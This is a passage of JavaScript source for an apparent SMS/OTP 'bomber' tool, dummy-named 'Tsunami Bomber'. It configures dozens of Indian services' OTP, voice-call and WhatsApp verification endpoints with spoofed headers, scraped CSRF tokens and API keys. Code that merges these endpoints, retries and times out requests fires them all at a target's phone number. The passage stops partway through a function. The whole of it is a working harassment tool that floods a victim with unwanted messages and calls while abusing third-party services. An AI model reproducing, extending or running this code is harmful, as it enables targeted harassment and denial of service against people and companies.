        "url": "https://ullu.app/ulluCore/api/v1/otp/sendRegisterOTP?mobileNumber={phone}",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "origin": "https://ullu.app",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "referer": "https://ullu.app/",
            "accept-encoding": "gzip, deflate",
            "accept-language": "en-US"
        },
        "data": {},
        "phone_format": "raw"
    },
    {
        "name": "Paytm",
        "method": "POST",
        "url": "https://accounts.paytm.com/v2/api/register",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Origin": "https://accounts.paytm.com",
            "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "Content-Type": "application/json",
            "Referer": "https://accounts.paytm.com/",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US"
        },
        "data": {
            "email": "",
            "mobile": "{phone}",
            "loginPassword": "Pura@1090",
            "csrfToken": "f7ea628c-91a2-5f14-82ca-6f7eee295b1d",
            "redirectUri": "https://paytm.com/v1/api/authresponse",
            "clientId": "paytm-web-secure",
            "scope": "paytm",
            "state": "",
            "responseType": "code",
            "theme": "mp-html5",
            "dob_agreement": true
        },
        "phone_format": "raw"
    },
    {
        "name": "Ogonn",
        "method": "POST",
        "url": "https://ogonn.in/otp",
        "headers": {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "origin": "https://ogonn.in",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "referer": "https://ogonn.in/login",
            "accept-encoding": "gzip, deflate",
            "accept-language": "en-US"
        },
        "data": { "_raw": "_token=I10LMVWBAN1c30T8SbgVHHvlKFTgTU1iFTm7hlfl&mobile={phone}" },
        "phone_format": "raw"
    },
    {
        "name": "AakashDigital_1",
        "method": "POST",
        "url": "https://digital.aakash.ac.in/mkt-signup-otp-verify",
        "headers": {
            "accept": "*/*",
            "origin": "https://digital.aakash.ac.in",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "referer": "https://digital.aakash.ac.in/",
            "accept-encoding": "gzip, deflate",
            "accept-language": "en-US"
        },
        "data": { "_raw": "&mobileval={phone}&otp=6230" },
        "phone_format": "raw"
    },
    {
        "name": "Swiggy",
        "method": "POST",
        "url": "https://www.swiggy.com/mapi/auth/signup",
        "headers": {
            "origin": "https://www.swiggy.com",
            "__fetch_req__": "true",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/json",
            "accept": "*/*",
            "referer": "https://www.swiggy.com/auth/register",
            "accept-encoding": "gzip, deflate",
            "accept-language": "en-US"
        },
        "data": {
            "name": "dbdbdbd",
            "email": "tsunami@gmail.com",
            "password": "sndndndbdj283jsbsbs",
            "referral_code": "",
            "mobile": "{phone}",
            "_csrf": "jK7JY3E9u8xJ-1Q_DUwsGnPDhccbB4rGz0dKIbfk"
        },
        "phone_format": "raw"
    },
    {
        "name": "Limeroad",
        "method": "POST",
        "url": "https://www.limeroad.com/auth/get_uuid_v2?ajax=true&ret=https://www.limeroad.com/myaccount/orders?ajax=true&mobileOnly=false&doAction=",
        "headers": {
            "origin": "https://www.limeroad.com",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/x-www-form-urlencoded",
            "accept": "*/*",
            "referer": "https://www.limeroad.com/",
            "accept-encoding": "gzip, deflate",
            "accept-language": "en-US"
        },
        "data": { "_raw": "utf8=%E2%9C%93&authenticity_token=6686Dtpby7plpvjXr5%2Fe8oyPdiQ3Weta9Y9ydzSRP64%3D&user_id={phone}" },
        "phone_format": "raw"
    },
    {
        "name": "Cilory",
        "method": "POST",
        "url": "https://www.cilory.com/app/w/auth/soft",
        "headers": {
            "accept": "application/json",
            "origin": "https://www.cilory.com",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/json;charset=UTF-8",
            "referer": "https://www.cilory.com/authentication",
            "accept-encoding": "gzip, deflate",
            "accept-language": "en-US"
        },
        "data": { "mobile": "{phone}" },
        "phone_format": "raw"
    },
    {
        "name": "Ajio_1",
        "method": "POST",
        "url": "https://login.web.ajio.com/api/auth/accountCheck",
        "headers": {
            "accept": "application/json",
            "Origin": "https://www.ajio.com",
            "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/json",
            "Referer": "https://www.ajio.com/signup",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US"
        },
        "data": { "emailId": "tsunami@gmail.com" },
        "phone_format": "raw"
    },
    {
        "name": "Ajio_2",
        "method": "POST",
        "url": "https://login.web.ajio.com/api/auth/signupSendOTP",
        "headers": {
            "accept": "application/json",
            "Origin": "https://www.ajio.com",
            "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/json",
            "Referer": "https://www.ajio.com/signup",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US"
        },
        "data": {
            "firstName": "Tsunami Bomber",
            "login": "tsunami@gmail.com",
            "password": "kd34646@3131nxnxn",
            "genderType": "",
            "mobileNumber": "{phone}",
            "requestType": "SENDOTP"
        },
        "phone_format": "raw"
    },
    {
        "name": "AakashDigital_2",
        "method": "POST",
        "url": "https://digital.aakash.ac.in/signup-otp-verify",
        "headers": {
            "accept": "*/*",
            "origin": "https://digital.aakash.ac.in",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "referer": "https://digital.aakash.ac.in/user/register",
            "accept-encoding": "gzip, deflate",
            "accept-language": "en-US"
        },
        "data": { "_raw": "&mobileval={phone}" },
        "phone_format": "raw"
    },
    {
        "name": "BookMyShow_1",
        "method": "POST",
        "url": "https://in.bookmyshow.com/pwa/api/uapi/otp/send",
        "headers": {
            "accept": "application/json",
            "save-data": "on",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://in.bookmyshow.com",
            "referer": "https://in.bookmyshow.com/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "data": { "channel": "phone", "subChannel": "sms", "details": { "phone": "{phone}", "origin": "https://in.bookmyshow.com" } },
        "phone_format": "raw"
    },
    {
        "name": "BigBasket",
        "method": "POST",
        "url": "https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/",
        "headers": {
            "accept": "application/json",
            "x-csrftoken": "gHbsx6okji95qhYgKApxE9vPjHhYlpBkgVd73fh23WRxl9XfmikiznVB1Jy2X2ED",
            "save-data": "on",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "x-channel": "BB-PWA",
            "content-type": "application/json",
            "origin": "https://www.bigbasket.com",
            "referer": "https://www.bigbasket.com/auth/login/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "data": { "identifier": "{phone}" },
        "phone_format": "raw"
    },
    {
        "name": "FloMattress",
        "method": "POST",
        "url": "https://cod.flomattress.com/api/otp",
        "headers": {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Save-Data": "on",
            "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.flomattress.com",
            "Referer": "https://www.flomattress.com/account/register",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "data": { "_raw": "number={phone}&store=hushbedding.myshopify.com" },
        "phone_format": "raw"
    },
    {
        "name": "Banggood",
        "method": "POST",
        "url": "https://m.banggood.in/index.php?com=login&t=sendMtSms&c=api",
        "headers": {
            "accept": "application/json",
            "x-requested-with": "XMLHttpRequest",
            "save-data": "on",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://m.banggood.in",
            "referer": "https://m.banggood.in/login.html",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "data": { "_raw": "mobilePhone={phone}&countryPhoneCode=91&type=1&verifyCode=KmUu" },
        "phone_format": "raw"
    },
    {
        "name": "Lenskart_1",
        "method": "POST",
        "url": "https://api.lenskart.com/v2/customers/sendOtp",
        "headers": {
            "origin": "https://www.lenskart.com",
            "x-b3-traceid": "991600776345288",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/json;charset=UTF-8",
            "accept": "application/json, text/plain, */*",
            "cache-control": "no-cache, no-store",
            "x-session-token": "3bcac6f3-bda5-4370-8dc1-eebd8274b399",
            "x-api-client": "mobilesite",
            "referer": "https://www.lenskart.com/customer/account/login",
            "accept-encoding": "gzip, deflate",
            "accept-language": "en-US"
        },
        "data": { "telephone": "{phone}" },
        "phone_format": "raw"
    },
    {
        "name": "UrbanClap",
        "method": "POST",
        "url": "https://www.urbanclap.com/api/v2/growth/profile/generateOTP",
        "headers": {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/json;charset=UTF-8",
            "accept": "application/json, text/plain, */*",
            "cache-control": "no-cache",
            "x-device-os": "web",
            "x-version-name": "web_v4.137.2",
            "save-data": "on",
            "origin": "https://www.urbancompany.com",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "data": {
            "country_id": "IND",
            "phone": { "isd_code": "+91", "phone_wo_isd": "{phone}" },
            "device_type": "customer"
        },
        "phone_format": "raw"
    },
    {
        "name": "Zee5",
        "method": "GET",
        "url": "https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno={phone}",
        "headers": {
            "accept": "*/*",
            "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "Origin": "https://www.zee5.com",
            "Referer": "https://www.zee5.com/",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "phone_format": "raw"
    },
    {
        "name": "Quikr",
        "method": "POST",
        "url": "https://www.quikr.com/core/sendOtp?_t=0e2ed2ef8cff0015a917b9cf98ccaea3",
        "headers": {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "accept": "*/*",
            "origin": "https://www.quikr.com",
            "referer": "https://www.quikr.com/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "data": { "_raw": "user={phone}&v3=true" },
        "phone_format": "raw"
    },
    {
        "name": "MakeMyTrip",
        "method": "POST",
        "url": "https://mapi.makemytrip.com/ext/web/pwa/isUserRegistered?region=in&language=eng&currency=inr",
        "headers": {
            "deviceid": "a3d2f892-af4d-40d1-808a-db6286b8fe1f",
            "currency": "inr",
            "language": "eng",
            "authorization": "h4nhc9jcgpAGIjp",
            "accept": "application/json",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://www.makemytrip.com",
            "referer": "https://www.makemytrip.com/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "data": { "loginId": "{phone}", "type": "MOBILE", "version": 2, "countryCode": "91" },
        "phone_format": "raw"
    },
    {
        "name": "Ola",
        "method": "POST",
        "url": "https://accounts.olacabs.com/api/login",
        "headers": {
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/json",
            "accept": "*/*",
            "origin": "https://accounts.olacabs.com",
            "referer": "https://accounts.olacabs.com/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "data": { "mobileNumber": "{phone}", "dialingCode": "+91", "countryCode": "IN" },
        "phone_format": "raw"
    },
    {
        "name": "EasyMyTrip",
        "method": "POST",
        "url": "https://mybookings.easemytrip.com/MyBooking/RegisterNewUser/",
        "headers": {
            "accept": "text/plain, */*; q=0.01",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/json; charset=UTF-8",
            "origin": "https://mybookings.easemytrip.com",
            "referer": "https://mybookings.easemytrip.com/MyBooking/Profile",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "data": { "emailph": "{phone}" },
        "phone_format": "raw"
    },
    {
        "name": "Oyo_1",
        "method": "POST",
        "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
        "headers": {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "text/plain;charset=UTF-8",
            "accept": "*/*",
            "origin": "https://www.oyorooms.com",
            "referer": "https://www.oyorooms.com/login",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "data": { "phone": "{phone}", "country_code": "+91", "nod": 4 },
        "phone_format": "raw"
    },
    {
        "name": "Dominos",
        "method": "POST",
        "url": "https://api.dominos.co.in/loginhandler/forgotpassword",
        "headers": {
            "api_key": "d2aeb489bb8df385",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "accept": "application/json, text/plain, */",
            "content-type": "application/json",
            "origin": "https://m.dominos.co.in",
            "referer": "https://m.dominos.co.in/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "data": { "lastName": "", "mobile": "{phone}", "firstName": "" },
        "phone_format": "raw"
    },
    {
        "name": "PizzaHut",
        "method": "POST",
        "url": "https://api.pizzahut.io/v1/otp/generate",
        "headers": {
            "content-type": "application/json; charset=utf-8",
            "accept": "/",
            "origin": "https://www.pizzahut.co.in",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "data": { "phone": "+91{phone}" },
        "phone_format": "with_plus91"
    },
    {
        "name": "KFC",
        "method": "POST",
        "url": "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin?ts=1604560285228",
        "headers": {
            "accept": "application/json, text/plain, /",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://online.kfc.co.in",
            "referer": "https://online.kfc.co.in/login",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "data": { "phoneNumber": "{phone}", "AuthorizedFor": "3", "Resend": "false" },
        "phone_format": "raw"
    },
    {
        "name": "BurgerKing",
        "method": "POST",
        "url": "https://consumer-apis.burgerking.in/api/v1/user/signUp",
        "headers": {
            "content-type": "application/json",
            "accept": "application/json, text/plain, */",
            "timestamp": "1604561218463",
            "platform": "web",
            "type": "dinein",
            "origin": "https://www.burgerking.in",
            "referer": "https://www.burgerking.in/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "data": { "phone_no": "{phone}" },
        "phone_format": "raw"
    },
    {
        "name": "Dineout",
        "method": "POST",
        "url": "https://www.dineout.co.in/xhrajaxrequest/user_signup",
        "headers": {
            "accept": "application/json, text/javascript, /; q=0.01",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.dineout.co.in",
            "referer": "https://www.dineout.co.in/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "data": { "_raw": "name=Tsunami+Bomber&email=tsunami%40gmail.com&phone={phone}" },
        "phone_format": "raw"
    },
    {
        "name": "Purplle",
        "method": "GET",
        "url": "https://www.purplle.com/api/account/authorization/send_otp?phone={phone}&action=register",
        "headers": {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded",
            "accept": "application/json, text/plain, /",
            "referer": "https://www.purplle.com/login",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "phone_format": "raw"
    },
    {
        "name": "AngelBroking",
        "method": "POST",
        "url": "https://www.angelbroking.com/form-gateways/oda-form.php",
        "headers": {
            "origin": "https://www.angelbroking.com",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8",
            "referer": "https://www.angelbroking.com/open-demat-account",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        "data": { "_raw": "name=Tsunami+Bomber&mobile={phone}&city=pune&post-id=2752" },
        "phone_format": "raw"
    }
];

// ===== VOICE APIS =====
const VOICE_APIS = [
    {
        name: "Tata Capital Voice",
        url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone, isOtpViaCallAtLogin: "true" }),
        phone_format: "raw"
    },
    {
        name: "1MG Voice",
        url: "https://www.1mg.com/auth_api/v6/create_token",
        method: "POST",
        headers: { "Content-Type": "application/json; charset=utf-8" },
        data: (phone) => JSON.stringify({ number: phone, otp_on_call: true }),
        phone_format: "raw"
    },
    {
        name: "Swiggy Voice",
        url: "https://profile.swiggy.com/api/v3/app/request_call_verification",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobile: phone }),
        phone_format: "raw"
    },
    {
        name: "Paytm Voice",
        url: "https://accounts.paytm.com/signin/voice-otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone: phone }),
        phone_format: "raw"
    },
    {
        name: "Ola Voice",
        url: "https://api.olacabs.com/v1/voice-otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone: phone }),
        phone_format: "raw"
    },
    {
        name: "Uber Voice",
        url: "https://auth.uber.com/v2/voice-otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone: `+91${phone}` }),
        phone_format: "raw"
    }
];

// ===== WHATSAPP APIS =====
const WHATSAPP_APIS = [
    {
        name: "KPN WhatsApp",
        url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        method: "POST",
        headers: { "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json; charset=UTF-8" },
        data: (phone) => JSON.stringify({ notification_channel: "WHATSAPP", phone_number: { country_code: "+91", number: phone } }),
        phone_format: "raw"
    },
    {
        name: "Foxy WhatsApp",
        url: "https://www.foxy.in/api/v2/users/send_otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ user: { phone_number: `+91${phone}` }, via: "whatsapp" }),
        phone_format: "raw"
    },
    {
        name: "Rappi WhatsApp",
        url: "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        method: "POST",
        headers: { "Content-Type": "application/json; charset=utf-8" },
        data: (phone) => JSON.stringify({ country_code: "+91", phone: phone }),
        phone_format: "raw"
    }
];

// ===== EXTRA APIS =====
const EXTRA_APIS = [
    {
        name: "Lenskart SMS",
        url: "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phoneCode: "+91", telephone: phone }),
        phone_format: "raw"
    },
    {
        name: "NoBroker SMS",
        url: "https://www.nobroker.in/api/v3/account/otp/send",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        data: (phone) => `phone=${phone}&countryCode=IN`,
        phone_format: "raw"
    },
    {
        name: "PharmEasy SMS",
        url: "https://pharmeasy.in/api/v2/auth/send-otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone: phone }),
        phone_format: "raw"
    },
    {
        name: "Hungama OTP",
        url: "https://communication.api.hungama.com/v1/communication/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobileNo: phone, countryCode: "+91", appCode: "un" }),
        phone_format: "raw"
    },
    {
        name: "Nykaa",
        url: "https://www.nykaa.com/app-api/index.php/customer/send_otp",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        data: (phone) => `source=sms&mobile_number=${phone}`,
        phone_format: "raw"
    },
    {
        name: "Rapido",
        url: "https://customer.rapido.bike/api/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobile: phone }),
        phone_format: "raw"
    },
    {
        name: "Dream11 Extra",
        url: "https://www.dream11.com/auth/passwordless/init",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ channel: "sms", flow: "SIGNUP", phoneNumber: phone }),
        phone_format: "raw"
    },
    {
        name: "Spinny",
        url: "https://api.spinny.com/api/c/user/otp-request/v3/",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ contact_number: phone, whatsapp: false, code_len: 4 }),
        phone_format: "raw"
    }
];

// ============================================================
// ===== MERGE ALL APIS =====
// ============================================================

const allApis = [...API_CONFIGS, ...VOICE_APIS, ...WHATSAPP_APIS, ...EXTRA_APIS];

const seenUrls = new Set();
const uniqueApis = [];
for (const api of allApis) {
    const urlKey = typeof api.url === 'function' ? `dynamic_${api.name || 'unknown'}` : api.url;
    if (!seenUrls.has(urlKey)) {
        seenUrls.add(urlKey);
        uniqueApis.push(api);
    }
}

logSuccess(`Loaded ${uniqueApis.length} unique APIs`);

// ============================================================
// ===== GLOBAL STATE =====
// ============================================================

let firstRunMode = false;
let slowModeLock = null;
let slowModeCompleted = false;
let autoSlowModeRunning = false;

// ============================================================
// ===== FIRST-RUN DETECTION =====
// ============================================================

async function checkFirstRun() {
    try {
        const count = await ApiHealth.countDocuments({ tested: true });
        if (count === 0) {
            firstRunMode = true;
            slowModeCompleted = false;
            logWarn('FIRST RUN MODE: No tested APIs found.');
        } else {
            firstRunMode = false;
            slowModeCompleted = true;
            const workingCount = await ApiHealth.countDocuments({ working: true });
            logSuccess(`Loaded ${count} tested APIs (${workingCount} working). Normal mode active.`);
        }
    } catch (err) {
        logError('First-run check error: ' + err.message);
    }
}

// ============================================================
// ===== API CALL FUNCTION (HARD TIMEOUT) =====
// ============================================================

function makeFallbackData(phone, apiName) {
    const lower = apiName.toLowerCase();
    if (lower.includes('voice') || lower.includes('call')) {
        return JSON.stringify({ mobile: phone });
    }
    if (lower.includes('whatsapp')) {
        return JSON.stringify({ mobile: phone, channel: "whatsapp" });
    }
    return JSON.stringify({ mobile: phone });
}

// 🔥 Internal axios call
async function _axiosCall(api, phone, timeoutMs, retryCount) {
    const startTime = Date.now();
    try {
        let url = api.url;
        if (typeof url === 'function') url = url(phone);
        else if (url.includes('{phone}')) url = url.replace(/{phone}/g, phone);

        const headers = { ...(api.headers || {}) };
        delete headers['content-length'];
        delete headers['Content-Length'];
        delete headers['host'];
        delete headers['Host'];

        let data = null;
        let isRaw = false;

        if (api.data) {
            if (typeof api.data === 'function') {
                data = api.data(phone);
            } else if (api.data._raw) {
                let rawData = api.data._raw;
                if (typeof rawData === 'string') {
                    rawData = rawData.replace(/{phone}/g, phone);
                }
                data = rawData;
                isRaw = true;
            } else {
                data = JSON.parse(JSON.stringify(api.data));
                const replacePhone = (obj) => {
                    if (typeof obj === 'string') return obj.replace(/{phone}/g, phone);
                    if (Array.isArray(obj)) return obj.map(replacePhone);
                    if (typeof obj === 'object' && obj !== null) {
                        const newObj = {};
                        for (let key in obj) newObj[key] = replacePhone(obj[key]);
                        return newObj;
                    }
                    return obj;
                };
                data = replacePhone(data);
            }
        } else {
            data = makeFallbackData(phone, api.name);
        }

        const method = (api.method || 'POST').toLowerCase();
        const config = {
            method,
            url,
            headers,
            timeout: timeoutMs,
            maxRedirects: 3,
            validateStatus: () => true
        };

        if (method === 'post' || method === 'put') {
            if (isRaw || typeof data === 'string') {
                config.data = data;
                if (typeof data === 'string' && data.includes('=') && !data.startsWith('{')) {
                    headers['Content-Type'] = 'application/x-www-form-urlencoded';
                }
            } else {
                config.data = JSON.stringify(data);
                if (!headers['Content-Type']) {
                    headers['Content-Type'] = 'application/json';
                }
            }
        }

        const response = await axios(config);
        const responseTime = Date.now() - startTime;
        const success = response.status >= 200 && response.status < 500;

        return { success, status: response.status, responseTime };
    } catch (err) {
        if (retryCount < 1 &&
            (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.code === 'ECONNABORTED')) {
            return _axiosCall(api, phone, timeoutMs, retryCount + 1);
        }

        if (err.response) {
            const status = err.response.status;
            const success = status >= 200 && status < 500;
            return { success, status, responseTime: Date.now() - startTime };
        }

        return { success: false, status: null, responseTime: Date.now() - startTime };
    }
}

// 🔥 HARD TIMEOUT wrapper — guarantees result in timeoutMs + buffer
async function makeApiCall(api, phone, timeoutMs = 5000, retryCount = 0) {
    const HARD_TIMEOUT_BUFFER = 1000;  // 1s extra buffer

    return Promise.race([
        _axiosCall(api, phone, timeoutMs, retryCount),
        new Promise((resolve) =>
            setTimeout(() => {
                resolve({
                    success: false,
                    status: null,
                    responseTime: timeoutMs + HARD_TIMEOUT_BUFFER,
                    hardTimeout: true
                });
            }, timeoutMs + HARD_TIMEOUT_BUFFER)
        )
    ]);
}

// ============================================================
// ===== FIRST-RUN SLOW MODE (LOCKED + HARD TIMEOUT) =====
// ============================================================

async function firstRunSlowMode(testPhone) {
    const phoneToTest = testPhone || AUTO_SLOW_MODE_PHONE;

